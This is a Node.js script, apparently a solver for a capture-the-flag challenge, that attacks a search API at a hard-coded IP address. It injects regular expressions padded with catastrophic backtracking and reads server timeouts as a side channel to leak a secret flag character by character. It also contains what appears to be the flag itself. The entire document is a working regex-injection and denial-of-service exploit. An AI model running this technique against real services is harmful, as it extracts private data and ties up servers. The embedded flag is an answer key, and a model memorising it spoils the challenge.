const axios = require('axios');

const chars = ': _-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.split('');
chars.push('\\\\{');
chars.push('\\\\}');

(async () => {
  let ans = 'Reminder: The flag is ';

  const response = await axios.get('http://34.84.233.159:49670/api/search', {
    params: {
      channel: '"a"a"',
      q: `"^Reminder: The flag is TSGCTF\\\\{Y0URETH3W1NNNER202OH\\\\}${'(.?){1000}'.repeat(200)}z$"`,
    },
    validateStatus: null,
  });
  console.log(response.status);

  while (true) {
    for (const char of chars) {
      console.log(`${ans}${char}`);
      const response = await axios.get('http://34.84.233.159:49670/api/search', {
        params: {
          channel: '"a"a"',
          q: `"^${ans}${char}${'(.?){1000}'.repeat(200)}z$"`,
        },
        validateStatus: null,
      });
      if (response.status === 504) {
        ans += char;
        break;
      }
    }
  }
})()
